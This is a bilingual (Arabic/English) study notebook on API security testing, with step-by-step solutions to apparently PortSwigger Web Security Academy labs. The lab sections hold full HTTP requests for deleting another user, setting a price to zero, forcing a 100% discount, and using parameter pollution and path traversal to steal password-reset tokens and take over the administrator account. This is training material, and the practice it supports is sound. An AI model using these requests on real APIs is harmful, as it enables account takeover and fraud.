


# API testing

- <details>
     <summary>API Recon & documentation</summary>


  # 🛡️ API Testing - شرح مبسط
  
  ## 📌 ما هو **API Testing**؟
  - **API (Application Programming Interface)** هو الوسيط الذي يسمح للبرامج أو السيرفرات بالتواصل مع بعضها.
  - أي موقع ديناميكي (dynamic) يتكون من APIs:
    - مثال: عند تسجيل الدخول **login** → API تستقبل الـ username/password.
    - مثال: عند جلب **profile info** → API تسحب البيانات من قاعدة البيانات وتعيدها في صورة JSON.
  
  ⚠️ إذا كانت الـ API بها ثغرة → هذا قد يؤثر على **Confidentiality, Integrity, Availability (CIA)**.
  
  ---
  
  ## 📌 العلاقة بين Web Testing و API Testing
  - معظم ثغرات الويب (SQLi, XSS, Auth bypass) يمكن أن تظهر في APIs.
  - الفرق أن **API Testing** يكشف أحيانًا Endpoints غير مستخدمة في الواجهة الأمامية (front-end)، لكنها مدعومة على السيرفر → توسع الـ attack surface.
  
  ---
  
  ## 📌 خطوات الـ Recon (استكشاف API)
  
  ### 1. **Identify Endpoints** (تحديد الـ endpoints)
  الـ endpoint هو مكان استقبال الطلبات.
  
  مثال:
  ```http
  GET /api/books HTTP/1.1
  Host: example.com
  ```
  
  - `/api/books` → endpoint  
  - يعيد قائمة من الكتب
  
  مثال آخر:
  - `/api/books/mystery` → يعيد قائمة بكتب الغموض
  
  ---
  
  ### 2. **افهم كيفية التعامل مع الـ API**
  لكي تبدأ اختبار يجب أن تعرف:
  - ✅ الـ input parameters (إجباري / اختياري)  
  - ✅ الـ HTTP methods المدعومة (GET, POST, PUT, DELETE…)  
  - ✅ الـ media formats (JSON, XML)  
  - ✅ هل يوجد Rate limiting (عدد الطلبات المسموح بها)  
  - ✅ آلية Authentication (Token / API Key / JWT)  
  
  ---
  
  ## 📌 API Documentation (التوثيق)
  - **Human-readable**: توثيق مكتوب يشرح الأمثلة والاستخدام.  
  - **Machine-readable**: ملفات JSON/XML (مثل Swagger أو OpenAPI).  
  
  🔍 **أماكن شائعة للتوثيق**:
  - `/api`
  - `/swagger/index.html`
  - `/openapi.json`
  
  مثال: لو وجدت `/api/swagger/v1/users/123`  
  جرب أيضًا:
  - `/api/swagger/v1`  
  - `/api/swagger`  
  - `/api`  
  
  🛠 يمكنك استخدام **Burp Scanner** أو **Intruder** لتجربة common paths.
  
  ---
  
  ## 📌 الخلاصة
  - **API Testing = Web Testing + Hidden attack surface**
  - تبدأ بالـ **Recon**: ابحث عن endpoints + documentation  
  - افهم كيف تعمل الـ API (inputs, methods, auth)  
  - ثم اختبر الثغرات مثل:
    - **SQLi داخل JSON**
    - **Auth bypass بالـ tokens**
    - **Server-side Parameter Pollution (SSPP)**
    - **Excessive Data Exposure** (إرجاع بيانات حساسة/زائدة)
  

  
  </details>





- <details>
     <summary>Interacting with API endpoints</summary>

     
     
     # 🛡️ API Testing 
     
     ## 1️⃣ Machine-readable Documentation (التوثيق القابل للمعالجة آليًا)
     - أحيانًا بتلاقي توثيق API في شكل **JSON / YAML** (زي Swagger أو OpenAPI).  
     - تقدر تستخدم Tools عشان تحللها أو تختبر الـ endpoints مباشرة.  
     
     🛠 الأدوات:
     - **Burp Scanner** → يقرأ OpenAPI docs ويعمل crawl & audit  
     - **OpenAPI Parser BApp** → تحليل OpenAPI داخل Burp Suite  
     - **Postman / SoapUI** → لاختبار الـ endpoints يدويًا أو أوتوماتيك  
     
     ---
     
     ## 2️⃣ Identifying API Endpoints (تحديد الـ endpoints)
     - حتى لو عندك documentation، لازم تراجع التطبيق بنفسك:  
       - ساعات الـ documentation قديمة أو ناقصة  
       - من خلال التطبيق نفسه ممكن تلاقي endpoints غير مذكورة  
     
     👀 أماكن محتملة للـ Endpoints:
     - **/api/** في الـ URLs  
     - **JavaScript files** → ممكن تحتوي API calls مخفية  
     - **Burp Scanner** → يلتقط بعض الـ endpoints  
     - **JS Link Finder BApp** → استخراج أعمق من ملفات JS  
     
     ---
     
     ## 3️⃣ Interacting with Endpoints (التفاعل مع الـ endpoints)
     - استخدم الأدوات:  
       - **Burp Repeater** → تجربة يدوية  
       - **Burp Intruder** → تجربة أوتوماتيكية  
     
     💡 جرب تغيّر:
     - **HTTP method** (GET, POST, PUT…)  
     - **Media type** (JSON, XML…)  
     - راقب **error messages** → ممكن تكشف تفاصيل عن الباك اند أو باراميترات إضافية  
     
     ---
     
     ## 4️⃣ Identifying Supported HTTP Methods
     - الـ **HTTP Method** يحدد نوع العملية:  
       - `GET` → جلب البيانات  
       - `PATCH` → تعديل جزئي  
       - `OPTIONS` → يكشف الـ methods المدعومة  
     
     👨‍💻 مثال على endpoint:
     ```
     GET /api/tasks        → يرجع قائمة المهام  
     POST /api/tasks       → ينشئ مهمة جديدة  
     DELETE /api/tasks/1   → يحذف مهمة برقم 1  
     ```
     
     🛠 Burp Intruder:
     - يحتوي على قائمة HTTP verbs جاهزة  
     - جربها تلقائيًا على endpoint لكشف methods إضافية  
     
     ⚠️ مهم: جرب على بيانات **قليلة الأهمية (low-priority)** لتجنب كسر أو تغيير بيانات production  
     
     ---
     
     ## 5️⃣ Identifying Supported Content Types (أنواع المحتوى)
     - الـ API غالبًا بتتوقع نوع محتوى محدد مثل `application/json`  
     - تغيير الـ Content-Type ممكن يفتح هجوم جديد  
     
     👀 الفوائد:
     - Trigger أخطاء تكشف معلومات  
     - Bypass دفاعات ضعيفة  
     - استغلال اختلاف المعالجة (مثال: آمن مع JSON لكن ضعيف مع XML)  
     
     🛠 Burp:
     - غيّر Header:
       ```http
       Content-Type: application/xml
       ```
     - وحوّل الـ body من JSON إلى XML  
     - **Content Type Converter BApp** يساعد في التحويل التلقائي بين JSON ↔ XML  
     
     ---
     
     ## 📌 الخلاصة
     - 📑 لو لقيت **Machine-readable docs** → حللها بالأدوات (Burp Scanner, Postman)  
     - 🔍 حتى مع docs → دايمًا اعمل Recon يدوي (URLs + JS files)  
     - 🎯 جرّب تتفاعل مع endpoints (HTTP methods, Content types)  
     - ⚡ الهدف: اكتشاف وظائف إضافية + ثغرات (SQLi, Auth bypass, Injection …)
     



     
  </details>





- <details>
     <summary>Mass assignment vulnerabilities</summary>



     
     
     
     # API Recon and Mass Assignment Vulnerabilities
     
     ## Using Intruder to Find Hidden Endpoints
     Once you have identified some initial API endpoints, you can use **Burp Intruder** to uncover hidden endpoints.
     
     **Example:**
     ```
     PUT /api/user/update
     ```
     
     You can test for hidden endpoints by replacing `/update` with common words like `delete`, `add`, etc., using a **wordlist**.
     
     👉 Use wordlists based on:
     - Common API naming conventions.
     - Industry terms.
     - Application-specific terms (from recon).
     
     ---
     
     ## Finding Hidden Parameters
     During API recon, you may find undocumented parameters that can affect application behavior.
     
     ### Tools to Help:
     - **Burp Intruder** → use a wordlist of common parameters.
     - **Param Miner BApp** → can guess up to 65,536 parameters automatically.
     - **Content Discovery Tool** → finds hidden/unlinked parameters.
     
     ---
     
     ## Mass Assignment Vulnerabilities
     Mass assignment (auto-binding) happens when frameworks automatically bind request parameters to internal object fields.
     
     This may expose unintended hidden parameters.
     
     ### Identifying Hidden Parameters
     You can often spot hidden parameters by analyzing API responses.
     
     **Example:**
     ```
     PATCH /api/users/
     {
         "username": "wiener",
         "email": "wiener@example.com"
     }
     ```
     
     A concurrent response from:
     ```
     GET /api/users/123
     {
         "id": 123,
         "name": "John Doe",
         "email": "john@example.com",
         "isAdmin": "false"
     }
     ```
     
     This hints that `id` and `isAdmin` may be hidden parameters.
     
     ---
     
     ## Testing for Mass Assignment
     Try modifying hidden parameters in requests.
     
     ### Test 1 - Normal update with hidden parameter:
     ```
     {
         "username": "wiener",
         "email": "wiener@example.com",
         "isAdmin": false
     }
     ```
     
     ### Test 2 - Invalid value for hidden parameter:
     ```
     {
         "username": "wiener",
         "email": "wiener@example.com",
         "isAdmin": "foo"
     }
     ```
     
     If behavior changes → parameter is being processed.
     
     ### Exploitation - Privilege Escalation:
     ```
     {
         "username": "wiener",
         "email": "wiener@example.com",
         "isAdmin": true
     }
     ```
     
     If bound without validation, the user may gain **admin privileges**.
     
     ---
     
     ## Key Takeaways
     - Intruder helps find hidden endpoints.
     - Param Miner & Intruder can find hidden parameters.
     - Mass assignment can expose sensitive parameters like `isAdmin`.
     - Always test with valid and invalid values to confirm vulnerability.
     
     





  </details>






- <details>
     <summary>Server-side parameter pollution</summary>


     <details>
     
     <img width="774" height="277" alt="image" src="https://github.com/user-attachments/assets/31406ab2-46e6-4171-b439-aa876d551c18" />
     
     <img width="842" height="373" alt="image" src="https://github.com/user-attachments/assets/db2fecd5-b365-4f6f-a7fe-e4aee42fecff" />
     
     <img width="744" height="612" alt="image" src="https://github.com/user-attachments/assets/422a0a92-6a6d-4b69-abcf-c78378bdc83b" />
     
     <img width="766" height="406" alt="image" src="https://github.com/user-attachments/assets/efa52df2-a6fc-48e4-ba92-076bcb6d872d" />
     
     <img width="762" height="410" alt="image" src="https://github.com/user-attachments/assets/c938e7c5-7897-4f86-a968-4528db4c3952" />
     
     <img width="772" height="596" alt="image" src="https://github.com/user-attachments/assets/fc0ae5b7-7f91-4276-91a6-966fb87993ef" />
     
     <img width="697" height="661" alt="image" src="https://github.com/user-attachments/assets/2985f930-0f96-41c0-8763-f5cd4a8277e8" />
     
     
          
     </details>
     
     
     
     





     
</details>


















































































----




# **`API Testing Labs`**


<details>
     <summary>Lab: Exploiting an API endpoint using documentation</summary>

#### 1. login with **`wiener : peter`**
#### 2. try to update your email and intercept the request

```http
PATCH /api/user/wiener HTTP/1.1
Host: 0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Cookie: session=vW7MD6H4rzuStWRQySgwcgcxMJiD8Rkk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 28
Origin: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive


{
  "email":"user@EXAMPLE.com"
}
```

**`Response`**

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 48


{
  "username":"wiener",
  "email":"user@EXAMPLE.com"
}
```

---

> ## what if we change user


```http
PATCH /api/user/carlos HTTP/1.1
Host: 0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Cookie: session=vW7MD6H4rzuStWRQySgwcgcxMJiD8Rkk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 28
Origin: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive


{
  "email":"plapla@EXAMPLE.com"
}
```

**`Response`**

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 48


{
  "username":"carlos",
  "email":"plapla@EXAMPLE.com"
}
```


> ## now try to change method from **`patch`** to **`DELETE`**

```http
DELETE /api/user/carlos HTTP/2
Host: 0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Cookie: session=vW7MD6H4rzuStWRQySgwcgcxMJiD8Rkk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 28
Origin: https://0a2c00a70361226d82a4ab5100250023.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers


{
  "email":"user@EXAMPLE.com"
}
```

**`Response`**

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 48


{
  "status":"user deleted"
}
```


> ## if we set path to **`/api`**

<img width="952" height="699" alt="image" src="https://github.com/user-attachments/assets/49f6beef-4bee-4ed1-a971-259b69a08f35" />


     
</details>




<details>
     <summary>Lab: Finding and exploiting an unused API endpoint</summary>

> 1. login as **`wiener : peter`**
> 2. select product and see the request


```http
GET /api/products/1/price HTTP/2
Host: 0a09004d047849308072fdd700a40031.web-security-academy.net
Cookie: session=RBZXiC5oIDzUl6EywnO4JLRjUHhyQUTO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09004d047849308072fdd700a40031.web-security-academy.net/product?productId=2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

```


### **`response`**


```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 97


{
  "price":"$1337",
  "message":"Buy quick, we are low on stock! 4 purchased in the last 14 minutes!"
}
```

---

> ## first try **`OPTIONS`** header to see which methods are allowed


```http
OPTIONS /api/products/1/price HTTP/2
Host: 0a09004d047849308072fdd700a40031.web-security-academy.net
Cookie: session=RBZXiC5oIDzUl6EywnO4JLRjUHhyQUTO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09004d047849308072fdd700a40031.web-security-academy.net/product?productId=2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

```


### **`response`**


```http
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

> ## found that **`GET, PATCH`** only allowd
> - now change method to **``PATCH``**


```
```http
PATCH /api/products/1/price HTTP/2
Host: 0a09004d047849308072fdd700a40031.web-security-academy.net
Cookie: session=RBZXiC5oIDzUl6EywnO4JLRjUHhyQUTO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09004d047849308072fdd700a40031.web-security-academy.net/product?productId=2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

```

### **`response`**

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 93


{
  "type":"ClientError",
  "code":400,
  "error":"Only 'application/json' Content-Type is supported"
}
```

> ## we found that content type must be json we will add this header
> - **`Content-Type: application/json`**
> - add json content with new price

```http
PATCH /api/products/1/price HTTP/2
Host: 0a09004d047849308072fdd700a40031.web-security-academy.net
Cookie: session=RBZXiC5oIDzUl6EywnO4JLRjUHhyQUTO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a09004d047849308072fdd700a40031.web-security-academy.net/product?productId=2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Type: application/json;

{
  "price":0
}


```

<img width="1434" height="540" alt="image" src="https://github.com/user-attachments/assets/bc003da5-54f5-49db-8f06-713ecb5022a1" />




     
</details>





<details>
     <summary>Lab: Exploiting a mass assignment vulnerability</summary>



> ### login with **`weiner : peter`**
> - select product and add it to cart
> - go to cart
> - see the requests

```http
GET /api/checkout HTTP/2
Host: 0ae7002004807898805f0da700d00007.web-security-academy.net
Cookie: session=SBR2e8LB8O2ZGiIREmLK2HR0S0aGCHsc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae7002004807898805f0da700d00007.web-security-academy.net/cart
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

### **`response`**

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153


{
   "chosen_discount":{
       "percentage":0
   },"chosen_products":[
      {
          "product_id":"1",
          "name":"Lightweight \"l33t\" Leather Jacket",
          "quantity":1,"item_price":133700
      }
  ]
}
```

----

> ## first set method to **`options`** to see which methods are allowed


```http
OPTIONS /api/checkout HTTP/2
Host: 0ae7002004807898805f0da700d00007.web-security-academy.net
Cookie: session=SBR2e8LB8O2ZGiIREmLK2HR0S0aGCHsc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae7002004807898805f0da700d00007.web-security-academy.net/cart
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

### **`response`**

```http
HTTP/2 405 Method Not Allowed
Allow: POST, GET
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20


"Method Not Allowed"
```

---

> ## Good now we can use **`post`** method to update **`discount percentage`** to `100``


```http
POST /api/checkout HTTP/2
Host: 0ae7002004807898805f0da700d00007.web-security-academy.net
Cookie: session=SBR2e8LB8O2ZGiIREmLK2HR0S0aGCHsc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae7002004807898805f0da700d00007.web-security-academy.net/cart
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

{
   "chosen_discount":{
       "percentage":100
   },"chosen_products":[
      {
          "product_id":"1",
          "name":"Lightweight \"l33t\" Leather Jacket",
          "quantity":1,"item_price":133700
      }
  ]
}


```

### **`response`**

```http
HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```



<img width="1516" height="700" alt="image" src="https://github.com/user-attachments/assets/8252e86b-421f-4c85-885b-8942edf5392c" />

<img width="1346" height="679" alt="image" src="https://github.com/user-attachments/assets/22e73718-d2c2-4d2b-8949-07d1caba2875" />




     
</details>






<details>
     <summary>Lab: Exploiting server-side parameter pollution in a query string</summary>


## try to reset password for user **`wiener`**

<img width="1177" height="402" alt="image" src="https://github.com/user-attachments/assets/31899866-d1d4-4327-91e8-c0df6ae3255c" />


## but we know that there is user called **`administrator`**

<img width="1177" height="395" alt="image" src="https://github.com/user-attachments/assets/ce896ced-71d9-4794-9819-d78602fe4a66" />


## note that there is **`/static/js/forgotPassword.js`** 

<img width="1570" height="686" alt="image" src="https://github.com/user-attachments/assets/e27d8981-09c6-4bfb-b206-dfc052c02b96" />


**`we found in it reset password function`**

```javascript

const displayMsg = (e) => {
    e.preventDefault();
    validateInputsAndCreateMsg(e);
};

forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});

```

> ## so we need **`reset-token`** parameter to reset the password

> ## now go back to **`reset-passowrd`**
> - try to inject **`#`** , **`&`** 

<img width="1169" height="464" alt="image" src="https://github.com/user-attachments/assets/59047886-df85-4aee-a454-0f27412f3bda" />

> ## now i try **`&`** and put **username** parameter to see if it will take the first value or the second

<img width="1163" height="483" alt="image" src="https://github.com/user-attachments/assets/08490d3b-f376-4029-b81e-0ad376416cd5" />

> ## ohh it take the second value

> ## now i will encode **`&`** and try to put any prameter maybe **`a=b`**

<img width="1168" height="430" alt="image" src="https://github.com/user-attachments/assets/074d8e30-26c2-486e-825e-c9ef9d4cc64c" />

> ## **`Parameter is not supported.`** so let's burte force it 

<img width="1610" height="544" alt="image" src="https://github.com/user-attachments/assets/dd518ccd-688e-4b2e-bd70-43e7a5f73180" />

> ## filtered it by length and found that **`feild`** parameter in response say **`Invalid field.`** so we know that there is parameter call **`feild`**
> - lets try to put it's value `username` , `email` , `password`

<img width="1049" height="428" alt="image" src="https://github.com/user-attachments/assets/4513b538-c4ec-4f43-8e61-e6f0c772daa8" />

<img width="1173" height="511" alt="image" src="https://github.com/user-attachments/assets/1801fb9a-f311-43e3-ab7f-bb71e8f94155" />

<img width="1157" height="499" alt="image" src="https://github.com/user-attachments/assets/076935ac-de88-41bf-98de-6f4c43f2bd26" />

> ## so what it we try **`reset-token`** that we need

<img width="1085" height="495" alt="image" src="https://github.com/user-attachments/assets/6ef6dfec-683b-4f80-9c92-8e59b169ee8a" />


```
2y0ykivivnl76kodlyx3adq5qzrp1mn6
```

> ## now

```
/forgot-password?reset_token=2y0ykivivnl76kodlyx3adq5qzrp1mn6
```


<img width="1055" height="680" alt="image" src="https://github.com/user-attachments/assets/658bab92-716d-449f-8710-c1e5909ce3f3" />


> ## now reset password and login as **`adminstrator`**

```
administrator : 123
```

<img width="1295" height="662" alt="image" src="https://github.com/user-attachments/assets/f7c5497c-1bf3-43fa-af17-10108b020d04" />


<img width="1237" height="545" alt="image" src="https://github.com/user-attachments/assets/0daf5a7b-a6db-41a6-a426-3f259a74e361" />



     
</details>








<details>
     <summary>Lab: Exploiting server-side parameter pollution in a REST URL</summary>



## try to reset password for user **`wiener`**

<img width="1177" height="402" alt="image" src="https://github.com/user-attachments/assets/31899866-d1d4-4327-91e8-c0df6ae3255c" />


## but we know that there is user called **`administrator`**

<img width="1272" height="347" alt="image" src="https://github.com/user-attachments/assets/30f29c6c-d34d-4de8-8401-fea9da7ca774" />



## note that there is **`/static/js/forgotPassword.js`** 

<img width="1024" height="581" alt="image" src="https://github.com/user-attachments/assets/e6cc63df-ff55-432a-a08f-ed35a8329b5d" />


```
passwordResetToken
```


> ## now go back to **`reset-passowrd`** request
> - try to inject **`#`** ,**`?`**

<img width="1397" height="469" alt="image" src="https://github.com/user-attachments/assets/ee49a51e-497d-464c-8aad-a9e8d5fb9f32" />

```json
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

> ## tell us that path is wrong so what if we try **`path traversal`**

```url
csrf=RMb3Ojh0eGcZTHwGXwi2wdfAMovtI3mi&username=../../../../../../../administrator?
```

## **`response`**

```json
{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```

> ## ohh found another error 

> ## lets try to know endpoints using **`openapi.json`**


- <details>
      <summary>what is openapi.json</summary>
     
     # Understanding `openapi.json` and Its Role in Attacks
     
     ## 1. ما هو `openapi.json`
     - ملف **`openapi.json`** هو **ملف توثيق للـ API** مكتوب بصيغة **JSON**.
     - يتبع **OpenAPI Specification (OAS)**، وهي مواصفة عالمية لتوثيق واجهات البرمجة (APIs).
     - الهدف منه:
       - شرح **Endpoints** (المسارات) المتاحة في الـ API.
       - توضيح **HTTP methods** المدعومة مثل: GET, POST, DELETE.
       - تحديد **الـ Parameters** المطلوبة مثل query params, body, headers.
       - عرض أنواع البيانات التي يرجعها الـ API.
     
     ### مثال على محتوى `openapi.json`
     ```json
     {
       "openapi": "3.0.0",
       "info": {
         "title": "Library API",
         "version": "1.0.0"
       },
       "paths": {
         "/api/books": {
           "get": {
             "summary": "Get all books",
             "responses": {
               "200": {
                 "description": "A list of books"
               }
             }
           },
           "post": {
             "summary": "Add a new book",
             "responses": {
               "201": {
                 "description": "Book created successfully"
               }
             }
           }
         }
       }
     }
     ```
     
     ### الفائدة للمهاجم:
     - معرفة كل **المسارات السرية** في الـ API.
     - تحديد **المعاملات (parameters)** المطلوبة لكل endpoint.
     - معرفة **أنواع الطلبات** التي يدعمها كل endpoint.
     - هذا يوفر الكثير من وقت **Reconnaissance** وكأنك حصلت على كود المصدر الخاص بالـ API.
     
     ---
     
     ## 2. ليه كتبنا `openapi.json` في الـ Payload
     الـ Payload المستخدم:
     ```
     csrf=RMb3Ojh0eGcZTHwGXwi2wdfAMovtI3mi&username=../../../../../../../openapi.json?
     ```
     
     ### الشرح:
     1. **`../../../../../../../`**
        -  **Path Traversal / Directory Traversal**.
        - الهدف منه الخروج من المجلد الحالي خطوة بخطوة حتى تصل إلى الجذر (`/`) في النظام.
        - بعد ذلك تحاول الوصول إلى ملف حساس مثل `openapi.json`.
     
     2. **`openapi.json`**
        - يمثل ملف توثيق الـ API.
        - استهدافه يمنحك رؤية كاملة لجميع الـ endpoints.
     
     ---
     
     ## 3. الهدف من الهجوم
     - محاولة **قراءة ملف التوثيق الداخلي** الخاص بالـ API.
     - إذا نجحت في الوصول إليه:
       - ستعرف **المسارات المخفية**.
       - ستكشف **المعاملات الحساسة** التي قد تستغلها.
       - ستتمكن من تحديد الثغرات مثل:
         - **IDOR (Insecure Direct Object Reference)**
         - **Privilege Escalation**
         - **SQL Injection**
         - **Mass Assignment**
     
     ---
     
     

  </details>

> # Don't forget **`?`**

```url
csrf=RMb3Ojh0eGcZTHwGXwi2wdfAMovtI3mi&username=../../../../../../../openapi.json?
```

## `response`


```json
{
  "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}
```

> ## we found that path

```url
/api/internal/v1/users/{username}/field/{field}
```

> ## let's try it with :
> - username : `administrator`
> - field : `email` , `username` , `password`

<img width="1329" height="418" alt="image" src="https://github.com/user-attachments/assets/47218c7c-ebd1-46d5-a767-0d086f9e769f" />

<img width="1144" height="439" alt="image" src="https://github.com/user-attachments/assets/f585aefd-1f24-4ad0-a874-32d9beca3900" />

<img width="1404" height="460" alt="image" src="https://github.com/user-attachments/assets/dda97963-95f3-415e-9db8-4417d6a04ef6" />


> ## now let's try **`passwordResetToken`** that we need

<img width="1249" height="506" alt="image" src="https://github.com/user-attachments/assets/1519289f-4c12-4735-ac3a-b5fb5bdedbd5" />


```
yummwyxyh4cibvzdp5g92ctc95a4obz5
```

> ## now reset password and login and remove carlos


````
/forgot-password?passwordResetToken=yummwyxyh4cibvzdp5g92ctc95a4obz5
````

<img width="1261" height="554" alt="image" src="https://github.com/user-attachments/assets/4edb02d7-d126-478c-87a6-6ace498ccab1" />



     
</details>


















